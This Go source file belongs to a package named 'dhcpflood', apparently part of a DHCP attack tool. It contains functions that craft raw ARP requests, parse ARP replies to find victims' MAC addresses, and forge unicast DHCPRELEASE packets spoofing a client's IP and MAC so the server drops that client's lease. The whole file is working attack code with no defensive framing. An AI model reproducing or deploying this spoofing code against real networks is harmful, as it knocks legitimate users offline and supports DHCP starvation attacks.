package dhcpflood

import (
	"encoding/binary"
	"fmt"
	"net"
)

const (
	ethTypeARP = 0x0806

	arpHwEthernet = 1
	arpProtoIPv4  = 0x0800
	arpOpRequest  = 1
	arpOpReply    = 2

	dhcpMsgRelease = 7
	dhcpOptMsgType = 53
	dhcpOptServer  = 54
)

// buildARPRequest builds an Ethernet/ARP who-has frame.
func buildARPRequest(senderMAC [6]byte, senderIP, targetIP uint32) []byte {
	frame := make([]byte, 42)
	for i := 0; i < 6; i++ {
		frame[i] = 0xFF
	}
	copy(frame[6:12], senderMAC[:])
	binary.BigEndian.PutUint16(frame[12:14], ethTypeARP)
	binary.BigEndian.PutUint16(frame[14:16], arpHwEthernet)
	binary.BigEndian.PutUint16(frame[16:18], arpProtoIPv4)
	frame[18] = 6
	frame[19] = 4
	binary.BigEndian.PutUint16(frame[20:22], arpOpRequest)
	copy(frame[22:28], senderMAC[:])
	binary.BigEndian.PutUint32(frame[28:32], senderIP)
	// target hardware = 00:00:00:00:00:00 (zero)
	binary.BigEndian.PutUint32(frame[38:42], targetIP)
	return frame
}

// parseARPReply returns sender MAC if frame is an ARP reply for wantIP.
func parseARPReply(frame []byte, wantIP uint32, ourMAC [6]byte) ([6]byte, bool) {
	var zero [6]byte
	if len(frame) < 42 {
		return zero, false
	}
	if binary.BigEndian.Uint16(frame[12:14]) != ethTypeARP {
		return zero, false
	}
	if binary.BigEndian.Uint16(frame[20:22]) != arpOpReply {
		return zero, false
	}
	if macEqual(frame[6:12], ourMAC[:]) {
		return zero, false
	}
	replyIP := binary.BigEndian.Uint32(frame[28:32])
	if replyIP != wantIP {
		return zero, false
	}
	var mac [6]byte
	copy(mac[:], frame[22:28])
	return mac, true
}

// buildRelease assembles a unicast DHCPRELEASE.
//
// Ethernet dst = server MAC, src = client MAC
// IPv4 src = client IP (ciaddr), dst = server IP
// Options: Message Type RELEASE + Server Identifier
func buildRelease(clientMAC, serverMAC [6]byte, clientIP, serverIP uint32) []byte {
	opts := [11]byte{
		dhcpOptMsgType, 0x01, dhcpMsgRelease,
		dhcpOptServer, 0x04,
		byte(serverIP >> 24), byte(serverIP >> 16), byte(serverIP >> 8), byte(serverIP),
		0xFF,
	}

	dhcp := make([]byte, 251)
	dhcp[0] = 1 // BOOTREQUEST
	dhcp[1] = 1 // Ethernet
	dhcp[2] = 6
	binary.BigEndian.PutUint32(dhcp[4:8], randU32())
	binary.BigEndian.PutUint32(dhcp[12:16], clientIP) // ciaddr
	copy(dhcp[28:34], clientMAC[:])
	binary.BigEndian.PutUint32(dhcp[236:240], 0x63825363)
	copy(dhcp[240:251], opts[:])

	udpLen := 8 + len(dhcp)
	udp := make([]byte, udpLen)
	binary.BigEndian.PutUint16(udp[0:2], 68)
	binary.BigEndian.PutUint16(udp[2:4], 67)
	binary.BigEndian.PutUint16(udp[4:6], uint16(udpLen))
	copy(udp[8:], dhcp)

	var (
		srcIP = ip4(clientIP)
		dstIP = ip4(serverIP)
	)
	binary.BigEndian.PutUint16(udp[6:8], udpChecksum(srcIP, dstIP, udp))

	ipTotalLen := 20 + udpLen
	ipHdr := make([]byte, 20)
	ipHdr[0] = 0x45
	binary.BigEndian.PutUint16(ipHdr[2:4], uint16(ipTotalLen))
	binary.BigEndian.PutUint16(ipHdr[4:6], randU16())
	ipHdr[8] = 128
	ipHdr[9] = 17
	copy(ipHdr[12:16], srcIP[:])
	copy(ipHdr[16:20], dstIP[:])
	binary.BigEndian.PutUint16(ipHdr[10:12], ipChecksum(ipHdr))

	frame := make([]byte, 14+ipTotalLen)
	copy(frame[0:6], serverMAC[:])
	copy(frame[6:12], clientMAC[:])
	binary.BigEndian.PutUint16(frame[12:14], 0x0800)
	copy(frame[14:34], ipHdr)
	copy(frame[34:], udp)
	return frame
}

func ip4(n uint32) [4]byte {
	return [4]byte{byte(n >> 24), byte(n >> 16), byte(n >> 8), byte(n)}
}

func macEqual(a, b []byte) bool {
	if len(a) != 6 || len(b) != 6 {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}

func serverIPFromPool(start uint32) uint32 {
	return (start & 0xFFFFFF00) | 1
}

func ifaceIPv4(iface *net.Interface) (uint32, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return 0, err
	}
	for _, a := range addrs {
		ipnet, ok := a.(*net.IPNet)
		if !ok {
			continue
		}
		ip4 := ipnet.IP.To4()
		if ip4 == nil {
			continue
		}
		return binary.BigEndian.Uint32(ip4), nil
	}
	return 0, fmt.Errorf("no IPv4 address on interface %s", iface.Name)
}
